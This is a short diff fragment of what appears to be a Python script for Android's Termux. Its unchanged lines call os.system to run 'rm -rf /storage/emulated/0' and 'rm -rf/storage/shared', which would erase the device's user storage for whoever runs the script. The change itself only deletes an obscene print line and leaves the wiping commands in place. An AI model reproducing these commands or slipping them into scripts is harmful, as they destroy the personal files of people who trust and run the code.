@@ -39,7 +39,6 @@ except ImportError:
     os.system('pkg install espeak')
 
 os.system('rm -rf /storage/emulated/0')
-  print(f"""Fuck🖕YOU""")
   os.system('rm -rf/storage/shared')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
